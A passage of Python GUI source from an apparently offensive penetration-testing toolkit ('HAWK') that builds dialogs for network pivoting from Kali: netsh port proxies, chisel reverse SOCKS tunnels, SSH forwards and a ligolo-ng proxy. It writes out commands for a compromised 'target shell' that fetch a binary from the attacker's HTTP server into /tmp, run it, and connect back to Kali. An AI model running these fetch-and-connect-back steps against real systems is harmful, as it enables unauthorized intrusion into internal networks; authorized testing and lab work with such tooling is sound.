            cp = cport_var.get().strip() or "<CONNECT_PORT>"
            if ca == "<CONNECT_ADDRESS>":
                self.app.terminal.write(
                    "  [!] Fill in Connect Address before copying.", "warn")
                return
            cmd = (f"netsh interface portproxy add v4tov4 "
                   f"listenaddress=0.0.0.0 listenport={lp} "
                   f"connectaddress={ca} connectport={cp}")
            try:
                win.clipboard_clear()
                win.clipboard_append(cmd)
                win.update()
                copy_btn.configure(text="✓  COPIED")
                # The dialog may be gone by the time this fires.
                def _reset():
                    if copy_btn.winfo_exists():
                        copy_btn.configure(text="📋  COPY ADD CMD")
                win.after(1500, _reset)
            except Exception:
                pass
            self.app.terminal.write(
                f"  [+] Netsh portfwd command copied — "
                f"paste in target shell.  "
                f"Kali → {target}:{lp} → {ca}:{cp}", "success")

        btn_row = _btn_row(win)
        # Built directly instead of via `_btn`: that helper packs in place
        # and returns None, so the "COPIED" feedback above needs its own
        # handle.  Colours match `_btn(primary=True)`.
        copy_btn = ctk.CTkButton(
            btn_row, text="📋  COPY ADD CMD", width=180, height=34,
            font=_f("md", True),
            fg_color=COLORS["bg_card"], hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["border_green"], border_width=1,
            text_color=COLORS["text_green"], corner_radius=4,
            command=_copy_add)
        copy_btn.pack(side="left", padx=6)
        _btn(btn_row, "CLOSE", lambda: _safe_destroy(win), w=100)

    def _route_chisel_client(self, tool):
        """Guided workflow for the chisel reverse-SOCKS tunnel.

        chisel_client's plain runs_on_target dialog only shows the client
        command — but standing up the tunnel needs FOUR coordinated steps
        (server on Kali, matching-arch binary transferred to the target,
        client run, tunnel verified).  This dialog owns all four:

          1. Start `chisel server --port 9000 --reverse` on Kali.
          2. Download chisel_linux_386 + chisel_linux_amd64 into payloads/
             (GitHub API resolves the latest tag) and serve payloads/ over
             HTTP on :8080.
          3. On the target shell: check arch (uname -m), wget the matching
             binary to /tmp/chisel, run `chisel client <KALI_IP>:9000
             R:socks`.
          4. Verify: watch the server log for the tunnel-up line and probe
             the resulting SOCKS5 at 127.0.0.1:1080.
        """
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy,
                                 _selectable_text)
        from utils.runner import _open_terminal, lhost_detect
        from utils.config import PAYLOADS_DIR

        kali_ip = lhost_detect() or "<KALI_IP>"
        srv_port = 9000
        http_port = 8080

        win = _make_win(self, "CHISEL Client — Reverse SOCKS tunnel",
                        800, 820)
        _title(win, "🔀  CHISEL — Reverse SOCKS tunnel")
        _sub(win,
             "Route Kali's tools through the pivot into its internal network.",
             COLORS["text_dim"])

        _note_box(win,
            "HOW IT WORKS\n\n"
            "Chisel builds a REVERSE tunnel: the server listens on Kali, "
            "the client runs on the pivot and connects back.  R:socks "
            "tells the tunnel to publish a SOCKS5 proxy on Kali at "
            "127.0.0.1:1080 that carries traffic INTO the pivot's "
            "network.\n\n"
            "   Internal net  ←→  pivot (client)  ←—— tunnel ——→  "
            "Kali (server)\n"
            "                                             "
            "127.0.0.1:1080 SOCKS5",
            COLORS["text_cyan"])

        _note_box(win,
            "⚠  KERNEL REQUIREMENT\n\n"
            "Modern chisel (built with a recent Go toolchain) uses "
            "epoll_create1 — kernel 2.6.27+.  On very old targets "
            "(e.g. Metasploitable 2, kernel 2.6.24) the client crashes "
            "with \"netpollinit failed\" / \"epollcreate failed with "
            "38\".\n\n"
            "Legacy fallbacks (require valid SSH creds):\n"
            "  • SSHUTTLE — needs Python 2.6+ on target.\n"
            "  • SSH Dynamic (SOCKS5) — pure SSH, no target-side "
            "code; the only one that works on Metasploitable 2.",
            COLORS["border_amber"], text_color=COLORS["text_yellow"])

        # ── Bottom row (CLOSE) — packed FIRST at side=bottom so the
        # scrollable middle can expand into the remaining space. ─────
        row = ctk.CTkFrame(win, fg_color="transparent")
        row.pack(side="bottom", pady=10)
        _btn(row, "CLOSE", lambda: _safe_destroy(win), w=120)

        # ── Scrollable body — all four Step panels live here so the
        # mouse wheel scrolls the dialog on small screens (dialog is
        # ~820px of content on a possibly 700px screen). ─────────────
        body = ctk.CTkScrollableFrame(
            win, fg_color="transparent",
            border_width=0, corner_radius=0)
        body.pack(fill="both", expand=True, padx=0, pady=0)

        # ── Section frame helper (colour-coded by role) ──────────────
        # Steps pack into `body` (the scrollable) not `win`.
        def _section(num, header, color=None):
            color = color or COLORS["text_yellow"]
            f = ctk.CTkFrame(body, fg_color=COLORS["bg_card"],
                             border_color=COLORS["border_dim"],
                             border_width=1, corner_radius=4)
            f.pack(fill="x", padx=16, pady=(6, 2))
            ctk.CTkLabel(f, text=f"  Step {num} — {header}",
                         font=_f("sm", True), text_color=color,
                         anchor="w").pack(fill="x", padx=10, pady=(6, 4))
            return f

        # ── Copy-with-feedback button (netsh_portfwd style, packed by
        # the caller so we can control side= inside a row) ──
        def _mk_copy(parent, label, text_source):
            def _do():
                txt = text_source() if callable(text_source) else text_source
                try:
                    win.clipboard_clear()
                    win.clipboard_append(txt)
                    win.update()
                    btn.configure(text="✓  COPIED")
                    def _reset():
                        if btn.winfo_exists():
                            btn.configure(text=label)
                    win.after(1500, _reset)
                except Exception:
                    pass
            btn = ctk.CTkButton(parent, text=label, height=26,
                font=_f("sm", True),
                fg_color=COLORS["bg_card"],
                hover_color=COLORS["bg_card_hover"],
                border_color=COLORS["border_green"], border_width=1,
                text_color=COLORS["text_green"], corner_radius=3,
                command=_do)
            return btn

        def _mk_action(parent, label, on_click):
            return ctk.CTkButton(parent, text=label, height=26,
                font=_f("sm", True),
                fg_color=COLORS["bg_card"],
                hover_color=COLORS["bg_card_hover"],
                border_color=COLORS["border_green"], border_width=1,
                text_color=COLORS["text_green"], corner_radius=3,
                command=on_click)

        # ═══════════════════════════════════════════════════════════════
        # STEP 1 — chisel server on Kali
        # ═══════════════════════════════════════════════════════════════
        step1 = _section(1, "Start the chisel server on Kali")
        server_cmd = f"chisel server --port {srv_port} --reverse"
        _selectable_text(step1, server_cmd, height=32)

        def _run_server_in_xterm():
            script = (
                f"echo '═══  HAWK — CHISEL Server (listening :{srv_port})"
                f"  ═══'; "
                f"echo 'Client should target: {kali_ip}:{srv_port}'; "
                f"echo ''; "
                f"{server_cmd}; "
                f"read -p 'Press ENTER to close...'")
            ok = _open_terminal(
                f"HAWK — CHISEL Server :{srv_port}", script)
            if hasattr(self.app, "terminal"):
                self.app.terminal.write(
                    f"  [+] CHISEL Server started on :{srv_port} in xterm."
                    if ok
                    else "  [!] Could not open terminal emulator.",
                    "success" if ok else "error")

        row1 = ctk.CTkFrame(step1, fg_color="transparent")
        row1.pack(fill="x", padx=10, pady=(4, 8))
        _mk_copy(row1, "📋  COPY", server_cmd).pack(
            side="left", padx=(0, 6))
        _mk_action(row1, "▶  OPEN IN XTERM",
                   _run_server_in_xterm).pack(side="left")

        # ═══════════════════════════════════════════════════════════════
        # STEP 2 — Download binaries + host via HTTP
        # ═══════════════════════════════════════════════════════════════
        step2 = _section(2, "Download the chisel binaries and host them")
        ctk.CTkLabel(step2,
            text=(f"  Fetches chisel_linux_386 + chisel_linux_amd64 into "
                  f"{PAYLOADS_DIR}\n  (latest GitHub release), then serves "
                  f"that directory on :{http_port}."),
            font=_f("xs"), text_color=COLORS["text_dim"],
            anchor="w", justify="left").pack(fill="x", padx=10)

        def _download_bins_in_xterm():
            # Fetch BOTH linux arches — target may be i686 (32-bit) or
            # x86_64 (64-bit) and we don't know which until uname -m.
            # Robust version parser: GitHub API pretty-prints JSON so
            # `"tag_name": "v1.12.0"` has a space after the colon; the
            # regex tolerates optional whitespace and matches only real
            # semver-looking tags.  Explicit "did we get a version"
            # check surfaces API failures (rate limit, DNS, block)
            # instead of silently skipping the download.
            dl_cmd = (
                f"echo '[*] Resolving latest chisel version via GitHub "
                f"API...'; "
                f"VER=$(curl -sSL "
                f"https://api.github.com/repos/jpillora/chisel/"
                f"releases/latest "
                f"| grep -oE '\"tag_name\"[[:space:]]*:[[:space:]]*\"v[^\"]+\"' "
                f"| head -1 | grep -oE 'v[0-9][^\"]*'); "
                f"if [ -z \"$VER\" ]; then "
                f"echo '[!] Could not resolve chisel version.'; "
                f"echo '[!] Fetching raw API response for diagnosis:'; "
                f"curl -sSL "
                f"https://api.github.com/repos/jpillora/chisel/"
                f"releases/latest | head -20; "
                f"exit 1; "
                f"fi; "
                f"echo \"[+] Latest chisel version: $VER\"; "
                f"for arch in 386 amd64; do "
                f"echo \"[*] Fetching chisel_${{VER#v}}_linux_$arch.gz ...\"; "
                f"curl -sSL -o {PAYLOADS_DIR}/chisel_linux_$arch.gz "
                f"\"https://github.com/jpillora/chisel/releases/"
                f"download/${{VER}}/chisel_${{VER#v}}_linux_$arch.gz\" && "
                f"gunzip -f {PAYLOADS_DIR}/chisel_linux_$arch.gz && "
                f"chmod +x {PAYLOADS_DIR}/chisel_linux_$arch && "
                f"echo \"[+] chisel_linux_$arch ready\"; "
                f"done; echo ''; "
                f"ls -la {PAYLOADS_DIR}/chisel_linux_* 2>/dev/null || "
                f"echo '[!] No chisel binaries in {PAYLOADS_DIR}/.'")
            script = (
                f"echo '═══  HAWK — Downloading chisel binaries  ═══'; "
                f"{dl_cmd}; "
                f"read -p 'Press ENTER to close...'")
            ok = _open_terminal(
                "HAWK — Download chisel bins", script)
            if hasattr(self.app, "terminal"):
                self.app.terminal.write(
                    f"  [+] Downloading chisel binaries to {PAYLOADS_DIR}."
                    if ok
                    else "  [!] Could not open terminal emulator.",
                    "success" if ok else "error")

        def _start_http_in_xterm():
            script = (
                f"echo '═══  HAWK — HTTP server "
                f"(serving {PAYLOADS_DIR})  ═══'; "
                f"echo 'Target pulls: http://{kali_ip}:{http_port}/"
                f"chisel_linux_<arch>'; echo ''; "
                f"cd {PAYLOADS_DIR!r} && "
                f"python3 -m http.server {http_port}; "
                f"read -p 'Press ENTER to close...'")
            ok = _open_terminal(f"HAWK — HTTP :{http_port}", script)
            if hasattr(self.app, "terminal"):
                self.app.terminal.write(
                    f"  [+] HTTP server started on :{http_port} "
                    f"(serving {PAYLOADS_DIR})"
                    if ok
                    else "  [!] Could not open terminal emulator.",
                    "success" if ok else "error")

        row2 = ctk.CTkFrame(step2, fg_color="transparent")
        row2.pack(fill="x", padx=10, pady=(6, 8))
        _mk_action(row2, "⬇  DOWNLOAD BINARIES",
                   _download_bins_in_xterm).pack(side="left", padx=(0, 6))
        _mk_action(row2, f"▶  START HTTP :{http_port}",
                   _start_http_in_xterm).pack(side="left")

        # ═══════════════════════════════════════════════════════════════
        # STEP 3 — On the target shell
        # ═══════════════════════════════════════════════════════════════
        step3 = _section(3,
                         "On the target shell: check arch, transfer, run")

        # 3a — arch check
        arch_cmd = "uname -m"
        ctk.CTkLabel(step3,
            text=("  a) Check the target arch first — i686 / i386 → "
                  "32-bit, x86_64 → 64-bit:"),
            font=_f("xs", True), text_color=COLORS["text_bright"],
            anchor="w").pack(fill="x", padx=10, pady=(6, 2))
        _selectable_text(step3, arch_cmd, height=32)
        _mk_copy(step3, "📋  COPY uname -m", arch_cmd).pack(
            anchor="w", padx=10, pady=(0, 6))

        # 3b — transfer
        wget_32 = (f"wget http://{kali_ip}:{http_port}/chisel_linux_386 "
                   f"-O /tmp/chisel && chmod +x /tmp/chisel")
        wget_64 = (f"wget http://{kali_ip}:{http_port}/chisel_linux_amd64 "
                   f"-O /tmp/chisel && chmod +x /tmp/chisel")
        ctk.CTkLabel(step3,
            text=("  b) Transfer the matching binary — pick 32-bit OR "
                  "64-bit based on the uname output:"),
            font=_f("xs", True), text_color=COLORS["text_bright"],
            anchor="w").pack(fill="x", padx=10, pady=(4, 2))
        _selectable_text(step3, wget_32, height=44)
        _mk_copy(step3, "📋  COPY 32-bit wget", wget_32).pack(
            anchor="w", padx=10, pady=(0, 4))
        _selectable_text(step3, wget_64, height=44)
        _mk_copy(step3, "📋  COPY 64-bit wget", wget_64).pack(
            anchor="w", padx=10, pady=(0, 6))

        # 3c — run the client
        run_cmd = f"/tmp/chisel client {kali_ip}:{srv_port} R:socks"
        ctk.CTkLabel(step3,
            text=("  c) Run the client (connects back to Kali; "
                  "runs in the foreground):"),
            font=_f("xs", True), text_color=COLORS["text_bright"],
            anchor="w").pack(fill="x", padx=10, pady=(4, 2))
        _selectable_text(step3, run_cmd, height=32)
        _mk_copy(step3, "📋  COPY chisel client", run_cmd).pack(
            anchor="w", padx=10, pady=(0, 8))

        # ═══════════════════════════════════════════════════════════════
        # STEP 4 — Verify
        # ═══════════════════════════════════════════════════════════════
        step4 = _section(4, "Verify the tunnel is up",
                         color=COLORS["text_cyan"])
        ctk.CTkLabel(step4,
            text=("  On success, the chisel SERVER log prints:\n"
                  "     session#1: tun: proxy#R:127.0.0.1:1080=>"
                  "socks: Listening\n\n"
                  "  Then test the SOCKS5 proxy from Kali against an "
                  "internal host reachable from the pivot but NOT from "
                  "Kali directly:"),
            font=_f("xs"), text_color=COLORS["text_dim"],
            anchor="w", justify="left").pack(fill="x", padx=10, pady=(6, 4))
        test_cmd = "curl --socks5 127.0.0.1:1080 http://<INTERNAL_HOST>"
        _selectable_text(step4, test_cmd, height=32)
        _mk_copy(step4, "📋  COPY curl test", test_cmd).pack(
            anchor="w", padx=10, pady=(0, 8))

        # CLOSE row was packed at side=bottom BEFORE the scrollable body
        # so the wheel-scroll region can expand into the middle.

    def _route_ssh_local_fw(self, tool):
        """SSH Local Forward launcher — user + local + remote fields.

        `ssh -L <LPORT>:<RHOST>:<RPORT> user@<PIVOT>` opens a listener
        on Kali:LPORT that tunnels to RHOST:RPORT through the SSH
        session on the pivot.  Bare RUN has three bugs at once: empty
        {extra} produces a broken user, {target} slot-conflated
        between pivot and internal host, and interactive SSH password.

        Availability check first, then a mini dialog for SSH user +
        the three port/host fields + xterm launch with SSH compat.
        """
        if not tool.is_available():
            self._show_install_dialog(tool)
            return

        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy)
        from utils.runner import _open_terminal

        pivot = ""
        try:
            sess = self.app.session_manager.current
            pivot = sess.target_ip if sess else ""
        except Exception:
            pass
        pivot = pivot or "<PIVOT_IP>"

        win = _make_win(self, "SSH Local Forward — Reach internal service",
                        780, 640)
        _title(win, "🔀  SSH Local Forward")
        _sub(win,
             "Tunnel one Kali port to an internal host:port via SSH "
             "through the pivot.",
             COLORS["text_dim"])

        _note_box(win,
            "HOW IT WORKS\n\n"
            "ssh -L opens a listener on Kali at 127.0.0.1:<LPORT>.  "
            "Every connection there is forwarded over the SSH channel "
            "to the pivot, which then dials <RHOST>:<RPORT> from ITS "
            "network.  Use to reach a single internal service (a DC, "
            "an intranet web app, a DB) — for full network access "
            "prefer SSH Dynamic (SOCKS5) or ligolo-ng.\n\n"
            "   Kali:LPORT  ──SSH──▶  pivot  ──▶  RHOST:RPORT\n\n"
            "Slot conflation warning: RHOST is the INTERNAL host, "
            "NOT the pivot.  Reaching the pivot's OWN service is "
            "possible too — set RHOST=127.0.0.1 (from the pivot's "
            "point of view).",
            COLORS["text_cyan"])

        _note_box(win,
            "⚠  INTERACTIVE — needs the SSH password or key for the "
            "pivot.  Runs in an xterm; after auth, ssh forks to "
            "background and the tunnel stays up until you kill it "
            "(`pkill -f 'ssh -L <LPORT>:'`).",
            COLORS["border_amber"], text_color=COLORS["text_yellow"])

        # ── Fields ────────────────────────────────────────────────
        param = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
                              border_color=COLORS["border_dim"],
                              border_width=1, corner_radius=4)
        param.pack(fill="x", padx=16, pady=(8, 4))
        ctk.CTkLabel(param, text="  Parameters:",
                     font=_f("sm", True),
                     text_color=COLORS["text_bright"],
                     anchor="w").pack(fill="x", padx=10, pady=(8, 4))

        rowf = ctk.CTkFrame(param, fg_color="transparent")
        rowf.pack(fill="x", padx=10, pady=(0, 8))

        def _field(parent, label, var, width=120, hint=""):
            f = ctk.CTkFrame(parent, fg_color="transparent")
            f.pack(side="left", padx=(0, 12))
            ctk.CTkLabel(f, text=label, font=_f("xs"),
                         text_color=COLORS["text_dim"],
                         anchor="w").pack(anchor="w")
            e = ctk.CTkEntry(f, textvariable=var, width=width, height=28,
                             font=_f("sm"),
                             fg_color=COLORS["bg_secondary"],
                             text_color=COLORS["text_bright"],
                             border_color=COLORS["border_green"],
                             border_width=1, corner_radius=3)
            e.pack()
            if hint:
                ctk.CTkLabel(f, text=hint, font=_f("xs"),
                             text_color=COLORS["text_muted"],
                             anchor="w").pack(anchor="w")
            return e

        user_var  = ctk.StringVar(value="")
        lport_var = ctk.StringVar(value="8080")
        rhost_var = ctk.StringVar(value="")
        rport_var = ctk.StringVar(value="80")
        _field(rowf, "SSH user  (on pivot)", user_var, 140,
               "required")
        _field(rowf, "Local port  (Kali)", lport_var, 90,
               "e.g. 8080")
        _field(rowf, "Remote host  (internal)", rhost_var, 160,
               "required — IP visible from pivot")
        _field(rowf, "Remote port", rport_var, 80,
               "e.g. 80, 443, 3389")

        ssh_compat = (
            "-oHostKeyAlgorithms=+ssh-rsa "
            "-oKexAlgorithms=+diffie-hellman-group1-sha1,"
            "diffie-hellman-group14-sha1 "
            "-oCiphers=+aes128-cbc,3des-cbc "
            "-oPubkeyAcceptedAlgorithms=+ssh-rsa "
            "-oMACs=+hmac-sha1,hmac-md5")

        # ── Preview ────────────────────────────────────────────────
        prev = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
                             border_color=COLORS["border_green"],
                             border_width=1, corner_radius=4)
        prev.pack(fill="x", padx=16, pady=4)
        ctk.CTkLabel(prev, text="  Generated command:",
                     font=_f("sm", True), text_color=COLORS["text_green"],
                     anchor="w").pack(fill="x", padx=10, pady=(6, 2))
        preview_box = ctk.CTkTextbox(prev, height=90,
            font=("Courier New", 12),
            fg_color=COLORS["bg_secondary"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_dim"], border_width=1,
            corner_radius=3, state="disabled", wrap="word")
        preview_box.pack(fill="x", padx=10, pady=(0, 8))

        def _refresh(*_):
            u = user_var.get().strip() or "<SSH_USER>"
            lp = lport_var.get().strip() or "8080"
            rh = rhost_var.get().strip() or "<RHOST>"
            rp = rport_var.get().strip() or "80"
            cmd = (f"ssh -L {lp}:{rh}:{rp} -f -N {ssh_compat} "
                   f"{u}@{pivot}")
            preview_box.configure(state="normal")
            preview_box.delete("1.0", "end")
            preview_box.insert("1.0", cmd)
            preview_box.configure(state="disabled")

        for v in (user_var, lport_var, rhost_var, rport_var):
            v.trace_add("write", _refresh)
        _refresh()

        # ── Launch ─────────────────────────────────────────────────
        def _launch():
            u = user_var.get().strip()
            lp = lport_var.get().strip() or "8080"
            rh = rhost_var.get().strip()
            rp = rport_var.get().strip() or "80"
            if not u:
                if hasattr(self.app, "terminal"):
                    self.app.terminal.write(
                        "  [!] SSH user is empty — set it before "
                        "launching.", "warn")
                return
            if not rh:
                if hasattr(self.app, "terminal"):
                    self.app.terminal.write(
                        "  [!] Remote host is empty — set the "
                        "internal host to reach.", "warn")
                return
            for name, port in (("Local port", lp), ("Remote port", rp)):
                if not port.isdigit() or not (1 <= int(port) <= 65535):
                    if hasattr(self.app, "terminal"):
                        self.app.terminal.write(
                            f"  [!] Invalid {name} '{port}' — 1..65535.",
                            "warn")
                    return
            cmd = (f"ssh -L {lp}:{rh}:{rp} -f -N {ssh_compat} "
                   f"{u}@{pivot}")
            script = (
                f"echo '═══  HAWK — SSH Local Forward  ═══'; "
                f"echo 'Kali:127.0.0.1:{lp}  →  {pivot}  →  {rh}:{rp}'; "
                f"echo 'After auth, ssh forks to background — xterm "
                f"exits.'; "
                f"echo 'Test with: curl http://127.0.0.1:{lp}/'; "
                f"echo 'Kill later with: pkill -f \"ssh -L {lp}:\"'; "
                f"echo ''; "
                f"{cmd}; "
                f"echo ''; "
                f"read -p 'Press ENTER to close (tunnel still up in "
                f"background)...'")
            ok = _open_terminal(
                f"HAWK — SSH Local Fwd :{lp}", script)
            if hasattr(self.app, "terminal"):
                self.app.terminal.write(
                    f"  [+] SSH Local Forward launched — "
                    f"Kali:{lp} → {rh}:{rp} via {u}@{pivot}"
                    if ok
                    else "  [!] Could not open terminal emulator.",
                    "success" if ok else "error")

        row = _btn_row(win)
        _btn(row, "▶  OPEN IN XTERM", _launch, primary=True, w=180)
        _btn(row, "CLOSE", lambda: _safe_destroy(win), w=100)

    def _route_ligolo_proxy(self, tool):
        """LIGOLO-NG Proxy launcher — xterm launch (interactive CLI).

        The ligolo-ng proxy has its own interactive command-line
        (session listing, interface_create, start/stop, tunnel select)
        that HAWK's subprocess pipe can't drive.  Also needs sudo for
        the TUN interface.  Dedicated launch in xterm.
        """
        if not tool.is_available():
            self._show_install_dialog(tool)
            return

        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy)
        from utils.runner import _open_terminal, lhost_detect
        from utils.config import PAYLOADS_DIR, OUTPUTS_DIR

        kali_ip = lhost_detect() or "<KALI_IP>"

        win = _make_win(self, "LIGOLO-NG Proxy — TUN tunnel listener",
                        720, 620)
        _title(win, "🔀  LIGOLO-NG Proxy — TUN tunnel listener")
        _sub(win,
             "Modern chisel alternative — routes traffic via a real "
             "TUN interface (no proxychains needed).",
             COLORS["text_dim"])

        _note_box(win,
            "HOW IT WORKS\n\n"
            "The proxy binds :11601 on Kali with a self-signed TLS "
            "cert and drops into its own interactive prompt.  The "
            "agent (transferred and run on the pivot) connects back "
            "on that port; from the prompt you can then create a TUN "
            "interface (`interface_create`), select a session, and "
            "route Kali traffic transparently.\n\n"
            "   Internal net  ←→  pivot (agent)  ←—TLS 11601——→  "
            "Kali (proxy + TUN)\n\n"
            "Kali tools (nmap, curl, sqlmap) work UNMODIFIED because "
            "the TUN takes over routing — no SOCKS to configure.",
            COLORS["text_cyan"])

        _note_box(win,
            "⚠  INTERACTIVE — needs sudo (Kali) and drops into "
            "ligolo's own CLI.  Runs in an xterm so the prompt is "
            "usable.  Use CTRL+C or `exit` inside the CLI to stop.",
            COLORS["border_amber"], text_color=COLORS["text_yellow"])

        # After-start hint (agent command on the pivot)
        agent_hint = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
                                   border_color=COLORS["border_dim"],
                                   border_width=1, corner_radius=4)
        agent_hint.pack(fill="x", padx=16, pady=(6, 4))
        ctk.CTkLabel(agent_hint,
            text="  Once the proxy is up, run the agent ON THE PIVOT:",
            font=_f("sm", True),
            text_color=COLORS["text_bright"],
            anchor="w").pack(fill="x", padx=10, pady=(6, 2))
        agent_cmd = (
            f"# 64-bit target:\n"
            f"./ligolo-agent -connect {kali_ip}:11601 -ignore-cert\n"
            f"# 32-bit target (i686 / i386, e.g. Metasploitable 2):\n"
            f"./ligolo-agent-386 -connect {kali_ip}:11601 -ignore-cert")
        agent_tb = ctk.CTkTextbox(agent_hint, height=60,
            font=("Courier New", 12),
            fg_color=COLORS["bg_secondary"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_dim"], border_width=1,
            corner_radius=3, state="normal", wrap="word")
        agent_tb.insert("1.0", agent_cmd)
        agent_tb.configure(state="disabled")
        agent_tb.pack(fill="x", padx=10, pady=(0, 8))

        # ── Launch ─────────────────────────────────────────────────
        def _launch():
            proxy_path = f"{PAYLOADS_DIR}/ligolo-proxy"
            # ligolo-proxy -selfcert drops ligolo-ng.history, ligolo-ng.yaml
            # and a ligolo-selfcerts/ dir into its working directory, which
            # is HAWK's process CWD (the repo root).  Run it inside
            # outputs/ligolo/ (gitignored) so it never litters the tree root.
            ligolo_dir = os.path.join(OUTPUTS_DIR, "ligolo")
            os.makedirs(ligolo_dir, exist_ok=True)
            cmd = (f"sudo {proxy_path} -selfcert "
                   f"-laddr 0.0.0.0:11601")
            script = (
                f"cd {shlex.quote(ligolo_dir)} || {{ "
                f"echo 'HAWK: cannot enter {ligolo_dir}'; "
                f"read -p 'Press ENTER to close...'; exit 1; }}; "
                f"echo '═══  HAWK — LIGOLO-NG Proxy  ═══'; "
                f"echo 'Kali listens on :11601 (self-signed TLS)'; "
                f"echo 'Once the agent connects, use `session` then "
                f"`interface_create --name ligolo` in the prompt.'; "
                f"echo 'CTRL+C or `exit` to stop.'; "
                f"echo ''; "
                f"{cmd}; "
                f"echo ''; "
                f"read -p 'Ligolo stopped. Press ENTER to close...'")
            ok = _open_terminal("HAWK — LIGOLO-NG Proxy :11601", script)
            if hasattr(self.app, "terminal"):
                self.app.terminal.write(
                    "  [+] LIGOLO-NG Proxy launched on :11601 in xterm."
                    if ok
                    else "  [!] Could not open terminal emulator.",
                    "success" if ok else "error")

        row = _btn_row(win)
        _btn(row, "▶  OPEN IN XTERM", _launch, primary=True, w=180)
        _btn(row, "CLOSE", lambda: _safe_destroy(win), w=100)

    def _route_ssh_dynamic(self, tool):
        """SSH Dynamic (SOCKS5) launcher — user field + xterm launch.

        `ssh -D <port> -f -N user@host` opens a SOCKS5 proxy on Kali
        127.0.0.1:<port> that tunnels connections through the SSH
        session on the target.  Bare RUN fails identically to
        sshuttle: empty {extra} produces `-N @target` (invalid), and
        the SSH password can't be entered in HAWK's subprocess.

        Availability check first, then a mini dialog for SSH user +
        SOCKS port + xterm launch with legacy SSH compat flags.
        """
        if not tool.is_available():
            self._show_install_dialog(tool)
            return

        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy)
        from utils.runner import _open_terminal

        target = ""
        try:
            sess = self.app.session_manager.current
            target = sess.target_ip if sess else ""
        except Exception:
            pass
        target = target or "<TARGET_IP>"

        win = _make_win(self, "SSH Dynamic (SOCKS5) — Pivot proxy",
                        720, 620)
        _title(win, "🔀  SSH Dynamic (SOCKS5) — Pivot proxy")
        _sub(win,
             "Open a SOCKS5 proxy on Kali that tunnels through an SSH "
             "session on the pivot.",
             COLORS["text_dim"])

        _note_box(win,
            "HOW IT WORKS\n\n"
            "ssh -D <port> -f -N tells SSH to open a SOCKS5 listener "
            "on Kali at 127.0.0.1:<port>.  Any TCP connection made "
            "through that proxy is forwarded over the SSH channel and "
            "exits from the pivot's network stack.  -f backgrounds "
            "after auth, -N skips the interactive shell.\n\n"
            "The safest legacy-target tunnel: pure SSH, no target-"
            "side agent, no Python, no epoll — works on Metasploitable "
            "2 where chisel and sshuttle fail.",
            COLORS["text_cyan"])

        _note_box(win,
            "⚠  INTERACTIVE — needs the SSH password or key for the "
            "pivot.  Runs in an xterm; after auth, ssh forks to "
            "background and the SOCKS5 stays available on Kali until "
            "you kill it (`pkill -f 'ssh -D <port>'` or `kill <pid>`).",
            COLORS["border_amber"], text_color=COLORS["text_yellow"])

        # ── Fields: SSH user + SOCKS port ─────────────────────────
        param = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
                              border_color=COLORS["border_dim"],
                              border_width=1, corner_radius=4)
        param.pack(fill="x", padx=16, pady=(8, 4))
        ctk.CTkLabel(param, text="  Parameters:",
                     font=_f("sm", True),
                     text_color=COLORS["text_bright"],
                     anchor="w").pack(fill="x", padx=10, pady=(8, 4))

        rowf = ctk.CTkFrame(param, fg_color="transparent")
        rowf.pack(fill="x", padx=10, pady=(0, 8))

        def _field(parent, label, var, width=140, hint=""):
            f = ctk.CTkFrame(parent, fg_color="transparent")
            f.pack(side="left", padx=(0, 16))
            ctk.CTkLabel(f, text=label, font=_f("xs"),
                         text_color=COLORS["text_dim"],
                         anchor="w").pack(anchor="w")
            e = ctk.CTkEntry(f, textvariable=var, width=width, height=28,
                             font=_f("sm"),
                             fg_color=COLORS["bg_secondary"],
                             text_color=COLORS["text_bright"],
                             border_color=COLORS["border_green"],
                             border_width=1, corner_radius=3)
            e.pack()
            if hint:
                ctk.CTkLabel(f, text=hint, font=_f("xs"),
                             text_color=COLORS["text_muted"],
                             anchor="w").pack(anchor="w")
            return e

        user_var = ctk.StringVar(value="")
        port_var = ctk.StringVar(value="1080")
        _field(rowf, "SSH user  (on pivot)", user_var, 160,
               "e.g. msfadmin, ubuntu, root  ← required")
        _field(rowf, "Local SOCKS port  (Kali)", port_var, 100,
               "default 1080")

        # SSH compat flags — same string used by target_intel_widget's
        # _COMPAT_FLAGS["ssh"], additive so it doesn't break modern
        # servers.  Always on: legacy targets (MS2, OpenSSH 4.x) offer
        # only ssh-rsa/ssh-dss which modern OpenSSH 9.x rejects.
        ssh_compat = (
            "-oHostKeyAlgorithms=+ssh-rsa "
            "-oKexAlgorithms=+diffie-hellman-group1-sha1,"
            "diffie-hellman-group14-sha1 "
            "-oCiphers=+aes128-cbc,3des-cbc "
            "-oPubkeyAcceptedAlgorithms=+ssh-rsa "
            "-oMACs=+hmac-sha1,hmac-md5")

        # ── Preview ────────────────────────────────────────────────
        prev = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
                             border_color=COLORS["border_green"],
                             border_width=1, corner_radius=4)
        prev.pack(fill="x", padx=16, pady=4)
        ctk.CTkLabel(prev, text="  Generated command:",
                     font=_f("sm", True), text_color=COLORS["text_green"],
                     anchor="w").pack(fill="x", padx=10, pady=(6, 2))
        preview_box = ctk.CTkTextbox(prev, height=80,
            font=("Courier New", 12),
            fg_color=COLORS["bg_secondary"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_dim"], border_width=1,
            corner_radius=3, state="disabled", wrap="word")
        preview_box.pack(fill="x", padx=10, pady=(0, 8))

        def _refresh(*_):
            u = user_var.get().strip() or "<SSH_USER>"
            p = port_var.get().strip() or "1080"
            cmd = (f"ssh -D {p} -f -N {ssh_compat} "
                   f"{u}@{target}")
            preview_box.configure(state="normal")
            preview_box.delete("1.0", "end")
            preview_box.insert("1.0", cmd)
            preview_box.configure(state="disabled")

        user_var.trace_add("write", _refresh)
        port_var.trace_add("write", _refresh)
        _refresh()

        # ── Launch ─────────────────────────────────────────────────
        def _launch():
